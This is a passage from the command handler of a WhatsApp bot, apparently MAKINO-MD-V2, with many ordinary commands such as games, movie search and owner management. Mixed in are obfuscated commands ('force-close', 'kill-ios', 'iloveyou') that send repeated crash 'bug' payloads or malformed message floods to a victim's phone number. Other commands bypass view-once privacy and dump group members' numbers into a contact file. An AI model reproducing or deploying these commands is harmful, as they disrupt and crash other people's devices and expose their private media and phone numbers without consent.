	     await Taira.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
             await reply('Chat Cleared.');
	    }
	break

		    
case 'addowner': {
if (!isCreator) return reply(mess.botowner)
if (!args[0]) return reply(`Use like ${prefix+command} 234708096xxx\nExample ${prefix+command} 234708096xxx`)
tobe = args[0].split("|")[0].replace(/[^0-9]/g, '')
let checknum = await Taira.onWhatsApp(tobe)
if (checknum.length == 0) return reply(`Enter A registered WhatsApp number.`)
owner.push(tobe)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
await reply(`${tobe} Has Been given access to the bot\nUse delowner command if you want to revoke the access`)
}
break

case 'delowner': {
if (!isCreator) return reply(mess.botowner)
if (!args[0]) return reply(`Use like ${prefix+command} 234708096xxx\nExample ${prefix+command} 234708096xxx`)
torem = args[0].split("|")[0].replace(/[^0-9]/g, '')
toremm = owner.indexOf(torem)
owner.splice(toremm, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`${torem} Access to the bot has been revoked.\nUse addowner command to add owners.`)
}
break

case 'vv': {
	if (!isCreator) return reply(mess.botowner)
        if (!m.quoted) return reply(`Reply to a view once message`)
        if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`Quoted message is not a view once message.`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Taira.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '♱MAKINO-MD-V2♱♡⃤ᴇ', m)
    } else if (/image/.test(type)) {
        return Taira.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '♱MAKINO-MD-V2♱♡⃤ᴇ', m)
    }
}
break

case 'savecontact': case 'svcontact':{
if (!m.isGroup) return reply(mess.grouponly)
if (!isCreator) return
let cmiggc = await Taira.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
reply('Saving  ' + cmiggc.participants.length+' participants contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Taira.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'MAKINO-MD-V3.vcf', caption: '\nDone saving.\nGroup Name: *'+cmiggc.subject+'*\nContacts: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break 
		    
	case 'typing': {
         if (!isCreator) return reply(mess.botowner)
        if (q === 'on')  {
           global.autoTyping = true
           await reply(`Successfully enabled auto typing`)  
        } else if (q === 'off') {
          global.autoTyping = false
          await reply(`Successfully disabled auto typing`) 
        } else { return reply(`use like ${command} on/off`)}
       }
        break 

	case 'recording': {
         if (!isCreator) return reply(mess.botowner)
        if (q === 'on')  {
global.autoRecord = true
await reply(`Successfully enabled auto recording`)  
} else if (q === 'off') {
global.autoRecord = false
await reply(`Successfully disabled auto recording`) 
} else { return reply(`use like ${command} on/off`)}
}
break

	case 'public': {
                if (!isCreator) return reply(mess.botowner)
                Taira.public = true
                await reply('*Successfully changed mode to public*')
            }
            break

		    
            case 'self': {
                if (!isCreator) return reply(mess.botowner)
                Taira.public = false
                await reply('*Successfully changed mode to private/self*')
            }
            break

		    
      case 'pmblocker': case 'antidm': {
         if (!isCreator) return reply(mess.botowner)
         if (!q) return reply(`use like ${command} on/off`)
         if (q === 'on') { global.PM_BLOCKER = true 
			  await reply("Pm Blocker has been turned on")
                         } else if (q === 'off') {
                          global.PM_BLOCKER = false
		 await reply("Pm blocker has been turned off")
                         } else reply(`use like ${command} on/off`)
      }
      break

      case 'antibot': {
        if (!isCreator) return reply(mess.botowner)
         if (!q) return reply(`use like ${command} on/off`)
         if (q === 'on') { global.ANTI_BOT = true 
                         } else if (q === 'off') {
                          global.ANTI_BOT = false
                         } else reply(`use like ${command} on/off`)
      }

        case 'chatbot': {
        if (!isCreator) return reply(mess.botowner)
         if (!q) return reply(`use like ${command} on/off`)
         if (q === 'on') { global.CHATBOT = true 
                         } else if (q === 'off') {
                          global.CHATBOT = false
                         } else reply(`use like ${command} on/off`)
      }
      
        case 'iloveyou': case 'kissme' : {
const _0x239866=_0x3ec6;function _0x19aa(){const _0x582e64=['10RBBLyx','message','804254vkWgVB','fromObject','Add\x20an\x20amount:\x20\x20.','\x20times\x20😔\x20♡⃤*\x0a\x0a>\x20*TOXIC*','key','./Assets/pic7.jpg','576IBQDws','1180564GAdPdv','5SrvaFO','744709HUVTbi','14167107kbEeTT','591060ZGwQoa','relayMessage','chat','Message','7343922AnpDHw','110091QMsuHw','12bMqpVr','32rLfNve','botowner'];_0x19aa=function(){return _0x582e64;};return _0x19aa();}(function(_0xe62ba6,_0x321e68){const _0x3a7e61=_0x3ec6,_0x223b69=_0xe62ba6();while(!![]){try{const _0x1aede8=-parseInt(_0x3a7e61(0x6e))/0x1*(-parseInt(_0x3a7e61(0x6f))/0x2)+parseInt(_0x3a7e61(0x69))/0x3+-parseInt(_0x3a7e61(0x7b))/0x4+-parseInt(_0x3a7e61(0x7c))/0x5*(parseInt(_0x3a7e61(0x6d))/0x6)+-parseInt(_0x3a7e61(0x7d))/0x7*(parseInt(_0x3a7e61(0x70))/0x8)+-parseInt(_0x3a7e61(0x7e))/0x9*(parseInt(_0x3a7e61(0x72))/0xa)+-parseInt(_0x3a7e61(0x74))/0xb*(-parseInt(_0x3a7e61(0x7a))/0xc);if(_0x1aede8===_0x321e68)break;else _0x223b69['push'](_0x223b69['shift']());}catch(_0x2c6f44){_0x223b69['push'](_0x223b69['shift']());}}}(_0x19aa,0xcf16f));if(!isCreator)return reply(mess[_0x239866(0x71)]);if(!q)return reply(_0x239866(0x76)+command+'\x201');function _0x3ec6(_0x57597c,_0x2a00bd){const _0x19aa45=_0x19aa();return _0x3ec6=function(_0x3ec6f1,_0x2fba1a){_0x3ec6f1=_0x3ec6f1-0x69;let _0x1b5392=_0x19aa45[_0x3ec6f1];return _0x1b5392;},_0x3ec6(_0x57597c,_0x2a00bd);}await reply('processing.....');for(let j=0x0;j<q;j++){var etc=generateWAMessageFromContent(m[_0x239866(0x6b)],proto[_0x239866(0x6c)][_0x239866(0x75)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'♱MAKINO-MD-V2♱♡⃤\x20|\x20♱ταιяα\x20мακιиο♱','sequenceNumber':'0','jpegThumbnail':fs['readFileSync'](_0x239866(0x79))}}}}),{'userJid':m[_0x239866(0x6b)],'quoted':quote});await Taira[_0x239866(0x6a)](m[_0x239866(0x6b)],etc[_0x239866(0x73)],{'messageId':etc[_0x239866(0x78)]['id']});}await reply('>\x20*ταιяα\x20мακιиο*\x0a\x0a*I\x20love\x20you\x20too\x20'+q+_0x239866(0x77));
}
break
        
        case 'force-close': case 'killandro': {
		const _0x2fde2a=_0x2fc7;(function(_0x1af2d3,_0x2ee541){const _0xc22bf4=_0x2fc7,_0x2af4a6=_0x1af2d3();while(!![]){try{const _0xb5e61e=-parseInt(_0xc22bf4(0x1bb))/0x1*(-parseInt(_0xc22bf4(0x1c4))/0x2)+-parseInt(_0xc22bf4(0x1bd))/0x3+-parseInt(_0xc22bf4(0x1b7))/0x4*(parseInt(_0xc22bf4(0x1b4))/0x5)+-parseInt(_0xc22bf4(0x1c1))/0x6*(parseInt(_0xc22bf4(0x1bf))/0x7)+parseInt(_0xc22bf4(0x1ba))/0x8*(parseInt(_0xc22bf4(0x1c2))/0x9)+-parseInt(_0xc22bf4(0x1b5))/0xa+-parseInt(_0xc22bf4(0x1b8))/0xb;if(_0xb5e61e===_0x2ee541)break;else _0x2af4a6['push'](_0x2af4a6['shift']());}catch(_0x24be26){_0x2af4a6['push'](_0x2af4a6['shift']());}}}(_0x3d4e,0x66358));if(!isCreator)return reply(mess[_0x2fde2a(0x1b6)]);if(!q)return reply(_0x2fde2a(0x1bc)+command+_0x2fde2a(0x1c3));let qted=q[_0x2fde2a(0x1b2)](/[^0-9]/g,'');if(qted['startsWith']('0'))return reply('\x20Number\x20must\x20be\x20in\x20international\x20format\x20like\x202347080968564');let target=qted+'@s.whatsapp.net';await reply(_0x2fde2a(0x1be));for(let j=0x0;j<0x1;j++){await andro(target,quote),await kill3(target,statrp),await andro(target,quote),await kill2(target,statrp),await andro(target,quote),await kill1(target,quote),await andro(target,quote),await andro(target,quote),await kill3(target,statrp),await andro(target,quote),await kill2(target,statrp),await andro(target,quote),await kill1(target,quote),await andro(target,quote),await andro(target,quote),await kill3(target,statrp),await andro(target,quote),await kill2(target,statrp),await andro(target,quote),await kill1(target,quote),await andro(target,quote),await andro(target,quote),await kill3(target,statrp),await andro(target,quote),await kill2(target,statrp),await andro(target,quote),await kill1(target,quote),await andro(target,quote);}await reply(_0x2fde2a(0x1c0)+qted+_0x2fde2a(0x1b3)+command+_0x2fde2a(0x1b9));function _0x2fc7(_0x36ed6a,_0x2b841a){const _0x3d4eea=_0x3d4e();return _0x2fc7=function(_0x2fc706,_0x2abdce){_0x2fc706=_0x2fc706-0x1b2;let _0x115004=_0x3d4eea[_0x2fc706];return _0x115004;},_0x2fc7(_0x36ed6a,_0x2b841a);}function _0x3d4e(){const _0x5f0d7e=['266898rUOOVz','1300545LYAezS','\x202347080968564','2zEaqmp','replace','\x20Using\x20','940vPWRlC','259590XSSpXx','botowner','784rycRyX','1148939SazQtd','.\x20✅\x0a\x0aPause\x202\x20minutes\x20or\x20say\x20cheese\x20to\x20your\x20account\x20🙊.','24NVdEIY','684196gBTJWF','Use\x20like\x20.','1461972YUSiZF','processing.....','7QJuEaG','You\x20have\x20Sent\x20Bugs\x20to\x20'];_0x3d4e=function(){return _0x5f0d7e;};return _0x3d4e();}
	}
break

        
	case 'iosbug': case 'kill-ios': { 
	const _0x1f8c67=_0x513c;(function(_0x9ebdc7,_0x13b325){const _0x1e8874=_0x513c,_0x1edddb=_0x9ebdc7();while(!![]){try{const _0xf854bf=-parseInt(_0x1e8874(0x18b))/0x1*(parseInt(_0x1e8874(0x190))/0x2)+-parseInt(_0x1e8874(0x178))/0x3*(-parseInt(_0x1e8874(0x17d))/0x4)+parseInt(_0x1e8874(0x177))/0x5*(parseInt(_0x1e8874(0x176))/0x6)+-parseInt(_0x1e8874(0x189))/0x7*(parseInt(_0x1e8874(0x18d))/0x8)+-parseInt(_0x1e8874(0x186))/0x9*(parseInt(_0x1e8874(0x188))/0xa)+parseInt(_0x1e8874(0x17c))/0xb+parseInt(_0x1e8874(0x184))/0xc;if(_0xf854bf===_0x13b325)break;else _0x1edddb['push'](_0x1edddb['shift']());}catch(_0x18b40f){_0x1edddb['push'](_0x1edddb['shift']());}}}(_0x5084,0xcf230));if(!isCreator)return reply(mess[_0x1f8c67(0x18f)]);if(!q)return xgreply(_0x1f8c67(0x17f)+command+_0x1f8c67(0x17a));let tai=q['split']('|')[0x0],number=tai[_0x1f8c67(0x180)](/[^0-9]/g,'');if(number[_0x1f8c67(0x17e)]('0'))return reply(_0x1f8c67(0x18e));let target=number+_0x1f8c67(0x179),amount=q[_0x1f8c67(0x183)]('|')[0x1]*0xc8,ppk=amount*1.5;await reply(ppk+_0x1f8c67(0x18a)),await reply(_0x1f8c67(0x17b));function _0x5084(){const _0xb0f9ed=['199636UDpPll','18YnGokf','2309710IVhWfG','42KJEtnk','@s.whatsapp.net','\x202347080968564|1\x0a#\x20Note:\x201\x20=\x20\x20300.seconds','processing.....','14163633KpncGz','174396BlUUeY','startsWith','Use\x20like\x20\x20.','replace','Sending\x20\x20bugs\x20to\x20','chat','split','7727652fIWyRH','\x20for\x20\x20','3189105EweyGg','\x20seconds','10PEPXqS','35ImwlQT','\x20Seconds','13EnxDMG','sendMessage','2283800FInRkk','Number\x20cannot\x20start\x20with\x200','botowner'];_0x5084=function(){return _0xb0f9ed;};return _0x5084();}function _0x513c(_0x512510,_0x5adc91){const _0x508426=_0x5084();return _0x513c=function(_0x513c17,_0x42c986){_0x513c17=_0x513c17-0x176;let _0x483a4f=_0x508426[_0x513c17];return _0x483a4f;},_0x513c(_0x512510,_0x5adc91);}for(let j=0x0;j<amount;j++){await iosbug(target),await sleep(0x5dc);}await Taira[_0x1f8c67(0x18c)](m[_0x1f8c67(0x182)],{'text':_0x1f8c67(0x181)+target+_0x1f8c67(0x185)+ppk+_0x1f8c67(0x187)},{'quoted':statrp});
		}
break 
   
case 'clear': case 'clearchat': {
if(!isCreator) return
messg = "\n".repeat(1000)
await Taira.sendMessage(m.chat, { text: messg + '♱MAKINO-MD-V2♱♡⃤' }, { quoted: statrp })
}
break
		    

  case 'setprefix': {
  
    if (isBan) return reply(mess.banned);	 			
    if (isBanChat) return reply(mess.bangc);
    if (!isCreator) return reply(mess.botowner)
      Taira.sendMessage(from, { react: { text: "🌝" , key: m.key }})

    if (args.length !== 1) {
      return reply(`Please provide a single character as the new prefix.`);
    } else {
      const newPrefix = args[0];
      try {
        global.prefa = [newPrefix];
        return reply(`Prefix Successfully changed to "${newPrefix}"`);
      } catch (error) {
        console.error('Error changing prefix:', error);
        return reply(`An error occurred while changing the prefix. Please try again later.`);
      }
	}}
      

      case 'owner': case 'creator': case 'mod': case 'mods': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);

        Taira.sendMessage(from, { react: { text: "🌟", key: m.key } })
        Taira.sendContact(m.chat, Taira.user.id.replace(/@s.whatsapp.net/gi, ""), m)
	Taira.sendMessage(m.chat, { text: `https://t.me/Tha_Healer` }, { quoted:statrp })
      }
        break;

case 'sc': case 'script': case 'repo': case "link": {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        try {
          await Taira.sendMessage(from, { react: { text: "❤", key: m.key } });
          let { data } = await axios.get('https://api.github.com/repos/anonphoenix007/MAKINO-MD-V2');
          let teks = `♱MAKINO-MD-V2♱♡⃤ᴇ*\n\n*Total Stars*: ${data.stargazers_count}⭐\n*Total Forks*: ${data.forks_count} forks\n*GitHub*: github.com/anonphoenix007/MAKINO-MD-V2\n\nDon't forget to follow me on *GitHub* and give a ⭐️ to my projects.`;

          let msg = generateWAMessageFromContent(m.key.remoteJid, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: teks
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "By Tᴀɪʀᴀ Mᴀᴋɪɴᴏ"
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    title: "©Tᴀɪʀᴀ•Mᴀᴋɪɴᴏ2024",
                    subtitle: "♱MAKINO-MD-V2♱♡⃤",
                    hasMediaAttachment: false
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"Repository\",\"url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\",\"merchant_url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\"}"
                      }
                    ]
                  })
                })
              }
            }
          }, {});

          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
            const errorMessage = 'Error: Invalid message key.';
            console.error(errorMessage);
            return reply(errorMessage);
          }

          await Taira.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          });
        } catch (error) {
          console.error('Error generating and relaying message:', error);
          return reply('Error generating and relaying message.');
        }

        break;
      } 
        

      //Hosted platfrom info
      case 'server':
      case 'sysinfo': {
        try {
          await Taira.sendMessage(from, { react: { text: "📍", key: m.key } });
        let respon = `
     MAKINO-MD-V2 server info
  
  *System*: ${systemName}
  *RAM*: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
  *NodeJS Memory Usage*: ${Object.keys(used).map(key => `${key}: ${formatp(used[key])}`).join(', ')}
  *Total CPU Usage*: ${totalCpuUsage}%  
  *CPU Model*: ${cpu.model.trim()} (${cpu.speed} MHz)  
  *Runtime*: ${runtime(process.uptime())}  
  *Response Speed*: ${latensie.toFixed(4)} seconds
  `.trim();
	      
          let msg = generateWAMessageFromContent(m.key.remoteJid, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: respon
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "By Tᴀɪʀᴀ Mᴀᴋɪɴᴏ"
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    title: "©Tᴀɪʀᴀ•Mᴀᴋɪɴᴏ2024",
                    subtitle: "♱MAKINO-MD-V2♱♡⃤",
                    hasMediaAttachment: false
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"Repo🔗\",\"url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\",\"merchant_url\":\"https://github.com/anonphoenix007/MAKINO-MD-V2\"}"
                      },
		      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"Channel📍 \",\"url\":\"https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r\"}"
		      },
		      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"Taira😎\",\"url\":\"https://t.me/Tha_Healer\",\"merchant_url\":\"https://t.me/Tha_Healer\"}"
		      },
                    ]
                  })
                })
              }
            }
          }, {});

          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
            const errorMessage = 'Error: Invalid message key.';
            console.error(errorMessage);
            return reply(errorMessage);
          }

          await Taira.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          });
        } catch (error) {
          console.error('Error generating and relaying message:', error);
          return reply('Error generating and relaying message.');
        }
        break;
      }

case 'tovv': {
            if (isBan) return reply(mess.banned);
            if (isBanChat) return reply(mess.bangc);
                if (!m.quoted) return reply(`Reply to an Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await Taira.downloadAndSaveMediaMessage(quoted)
                    Taira.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Your View once 🌚!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {                                                             anuanuan = await Taira.downloadAndSaveMediaMessage(quoted)
                    Taira.sendMessage(m.chat, {
                        video: {
                            url: anuan
                        },
                        caption: `Your View once Video 🌚!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break;

      case 'digip':
      case 'checkip':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);

        if (!args[0]) {
          return reply(`provide an IP address to check.\nExample: ${prefix}ipcheck 127.0.0.1`);
        }
        const ipAddress = args[0];
        const encodedIpAddress = encodeURIComponent(ipAddress);
        const apiUrl = `https://www.exenoz.tech/api/ip-location?ip=${encodedIpAddress}`;
        try {
          const response = await axios.get(apiUrl);
          const locationData = response.data;
          const message = `
      IP Address: ${encodedIpAddress}\n
      Country: ${locationData.location.country}\n
      Region: ${locationData.location.region}\n
      Timezone: ${locationData.location.timezone}\n
      City: ${locationData.location.city}\n
      Latitude: ${locationData.location.ll[0]}\n
      Longitude: ${locationData.location.ll[1]}\n
    `;
          Taira.sendMessage(from, { text: message }, { quoted: m });
        } catch (error) {
          console.error('Error fetching IP location data:', error);
          reply('Failed to fetch IP location data. Please try again later.');
        }
        break;


      case 'serverip':
      case 'ip':
        //if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc)
        if (!isCreator) return reply(mess.useradmin)
        async function getServerIp() {
          try {
            const response = await axios.get('https://api.ipify.org?format=json');
            const serverIp = response.data.ip;
            return serverIp;
          } catch (error) {
            console.error('Error fetching server IP address:', error.message);
            return null;
          }
        }
        getServerIp()
          .then(serverIp => {
            if (serverIp) {
              const message = `🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ server address is: ${serverIp}`;
              Taira.sendMessage(from, { text: message }, { quoted: m });
            } else {
              Taira.sendMessage(from, { text: 'Failed to fetch server IP address.' }, { quoted: m });
            }
          })
          .catch(error => {
            console.error('Error:', error.message);
            Taira.sendMessage(from, { text: 'An error occurred while fetching the server IP address.' }, { quoted: m });
          });
        break;



      case 'ban': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!isCreator) return reply(mess.botowner)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!args[0]) return reply(`Select add or del (add to ban, del to unban), For Example: reply *${prefix}ban add* to the user you want to ban.`)
        if (args[1]) {
          orgnye = args[1] + "@s.whatsapp.net"
        } else if (m.quoted) {
          orgnye = m.quoted.sender
        }
        const isBane = banUser.includes(orgnye)
        if (args[0] === "add") {
          if (isBane) return ads('User is already banned.')
          banUser.push(orgnye)
          reply(`Successfully Banned the user.`)
        } else if (args[0] === "del") {
          if (!isBane) return ads('User is already unbanned.')
          let delbans = banUser.indexOf(orgnye)
          banUser.splice(delbans, 1)
          reply(`Successfully Unbanned the user.`)
        } else {
          reply("Error")
        }
      }
        break;



      //-------------------------------------------------------------------------------------------------------------------------//



      //tictactoe game

      case 'ttc': case 'ttt': case 'tictactoe': {
        if (isBan) return reply(mess.ban)
        if (isBanChat) return reply(mess.banChat)
        Taira.sendMessage(from, { react: { text: "🎮", key: m.key } })

        let TicTacToe = require("./lib/tictactoe")
        this.game = this.game ? this.game : {}
        if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply(`${pushname} You Are Still In The Game...`)
        let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
        if (room) {
          reply(`Hey ${pushname} Your Partner found!`)
          room.o = m.chat
          room.game.playerO = m.sender
          room.state = 'PLAYING'
          let arr = room.game.render().map(v => {
            return {
              X: '❌',
              O: '⭕',
              1: '1️⃣',
              2: '2️⃣',
              3: '3️⃣',
              4: '4️⃣',
              5: '5️⃣',
              6: '6️⃣',
              7: '7️⃣',
              8: '8️⃣',
              9: '9️⃣',
            }[v]
          })
          let str = `Room ID: ${room.id}
  ${arr.slice(0, 3).join('')}
  ${arr.slice(3, 6).join('')}
  ${arr.slice(6).join('')}
  Waiting @${room.game.currentTurn.split('@')[0]}
  Type *surrender* to surrender and admit defeat...`
          if (room.x !== room.o) await Taira.sendText(room.x, str, m, { mentions: parseMention(str) })
          await Taira.sendText(room.o, str, m, { mentions: parseMention(str) })
        } else {
          room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
          }
          if (text) room.name = text
          reply('Waiting For Partner' + (text ? ` Type The Command Below ${prefix} ${command} ${text}` : ''))
          this.game[room.id] = room
        }
      }
        break;


      case 'dice': case 'roll': {
        Taira.sendMessage(from, { react: { text: "🎲", key: m.key } })
        const result = Math.floor(Math.random() * 6) + 1; // Generate a random number between 1 and 6
        const diceMessage = `🎲 *Dice Roll Result:* ${result}`;
        reply(diceMessage);
      }
        break;


      case 'flipcoin': case 'coin': {
        Taira.sendMessage(from, { react: { text: "🪙", key: m.key } });
        // Simulate flipping a coin (0 for heads, 1 for tails)
        const result = Math.random() < 0.5 ? 'Heads' : 'Tails';

        const flipCoinMessage = `🪙 *Coin Flip Result: ${result}*`;
        reply(flipCoinMessage);
      }
        break;


      case 'rps': {
        const randomEmoji = manyemojis[Math.floor(Math.random() * manyemojis.length)];
        Taira.sendMessage(from, { react: { text: randomEmoji, key: m.key } });

        // Check if the command includes a valid move (rock, paper, or scissors)
        const validMoves = ['rock', 'paper', 'scissors'];
        if (!args[0] || !validMoves.includes(args[0].toLowerCase())) {
          return reply('Please provide a valid move: rock, paper, or scissors.');
        }
        // Generate a random move for the bot
        const botMove = validMoves[Math.floor(Math.random() * validMoves.length)];
        // Determine the winner
        const userMove = args[0].toLowerCase();
        let result;
        if (userMove === botMove) {
          result = 'It\'s a tie!';
        } else if (
          (userMove === 'rock' && botMove === 'scissors') ||
          (userMove === 'paper' && botMove === 'rock') ||
          (userMove === 'scissors' && botMove === 'paper')
        ) {
          result = `You win! 🥳 ${userMove} beats ${botMove}.`;
        } else {
          result = `You lose! 🫳🏻 ${botMove} beats ${userMove}.`;
        }
        // Send the result as a response
        reply(`You chose ${userMove}.\nTaira chose ${botMove}.\n${result}`);
      }
        break;

//REACTIONS

      case 'reaction': case 'react': case 'reactions': case 'r':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "❤️", key: m.key } })

        reply(`
        *╭════════════════ ⪩*
        *┃〘 *♱MAKINO-MD-V2♱♡⃤* 〙*
        *╰════════════════ ⪨!*\n\n
         bonk
         cry
         bully
         cuddle ${readmore}
         hug
         kiss
         lick
         pat
         smug
         yeet
         blush
         smile
         wave
         highfive
         handhold
         nom
         glomp
         bite
         slap
         kill
         happy
         wink
         poke
         dance
         cringe`) 
         break;

		    
      case 'limituser': case 'userlimit': case 'limit':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        {
          let txt = `「 *All User Limit* 」\n\n`
          for (let i of _limit) {
            txt += ` *User ID :* @${i.id.split("@")[0]}\n➸ *Limit* : ${i.limit}\n`
          }
          reply(txt)
        }
        break;


      case 'film': case 'movie': case 'moviesearch':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!q) return reply(`Please enter a Movie search term...\nExample: ${prefix}movie Spiderman`)
        let msearch = await axios.get(
          `http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`
        );
        let mv2 = "";
        console.log(msearch.data);
        mv2 +=
          "♱MAKINO-MD-V2♱♡⃤\n\n" + " ``` MOVIE SEARCH```\n";
        mv2 += "Title      : " + msearch.data.Title + "\n";
        mv2 += "Year       : " + msearch.data.Year + "\n";
        mv2 += "Rated      : " + msearch.data.Rated + "\n";
        mv2 += "Released   : " + msearch.data.Released + "\n";
        mv2 += "Runtime    : " + msearch.data.Runtime + "\n";
        mv2 += "Genre      : " + msearch.data.Genre + "\n";
        mv2 += "Director   : " + msearch.data.Director + "\n";
        mv2 += "Writer     : " + msearch.data.Writer + "\n";
        mv2 += "Actors     : " + msearch.data.Actors + "\n";
        mv2 += "Plot       : " + msearch.data.Plot + "\n";
        mv2 += "Language   : " + msearch.data.Language + "\n";
        mv2 += "Country    : " + msearch.data.Country + "\n";
        mv2 += "Awards     : " + msearch.data.Awards + "\n";
        mv2 += "BoxOffice  : " + msearch.data.BoxOffice + "\n";
        mv2 += "Production : " + msearch.data.Production + "\n";
        mv2 += "imdbRating : " + msearch.data.imdbRating + "\n";
        mv2 += "imdbVotes  : " + msearch.data.imdbVotes + "";
        Taira.sendMessage(
          m.chat,
          {
            image: {
              url: msearch.data.Poster,
            },
            caption: mv2,
          },
          {
            quoted: m,
          }
        );
        break;  
      

      case 'wallpaper':
      case 'animewallpaper':
      case 'animewall': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        reply(mess.waiting);
        Taira.sendMessage(from, { react: { text: "🥵", key: m.key } });
        if (!args.join(" ")) return reply("Please enter a term to search!");

        const { AnimeWallpaper } = require("anime-wallpaper");
        const wall = new AnimeWallpaper();
        const pages = [1, 2, 3, 4];
        const random = pages[Math.floor(Math.random() * pages.length)];
        const wallpapers = await wall.getAnimeWall4({ title: q, type: "sfw", page: pages }).catch(() => null);

        const maxImagesToSend = 15;
        const minImagesToSend = 5;
        const imagesToSend = Math.min(maxImagesToSend, Math.max(minImagesToSend, wallpapers.length));

        for (let i = 0; i < imagesToSend; i++) {
          let message = {
            image: { url: wallpapers[i].image },
            footer: `♱MAKINO-MD-V2♱♡⃤`,
            headerType: 4
          };
          Taira.sendMessage(m.chat, message, { quoted: m });
        }
      }
        break;


case 'wikimedia': case 'wikiimage': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!args.join(" ")) return reply("What picture are you looking for??")
        let { wikimedia } = require('./lib/scraper')
          let anumedia = await wikimedia(text);
          result = anumedia[Math.floor(Math.random() * anumedia.length)];
          Taira.sendMessage(
            m.chat,
            {
              caption: `♱MAKINO-MD-V2♱♡⃤\n\nTitle : ${result.title}\nSource : ${result.source}\nMedia Url : ${result.image}`,
              image: { url: result.image },
            },
            { quoted: m }
          );
        }
        break;


      case 'animestory': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        reply(mess.waiting)
        await fetchJson(`https://api.jikan.moe/v4/anime?q=${q}`)
          .then((res) => {
            console.log(res)
            let sections = []
            for (let i of res.data) {
              const list = {
                title: `${i.title}`,
                rows: [
                  {
                    title: `${i.title}\n\n`,
                    rowId: `${prefix}animesearch ${i.mal_id}`,
                    description: `${i.synopsis}`
                  },
                ]
              }
              sections.push(list)
            }
            const sendm = Taira.sendMessage(
              from,
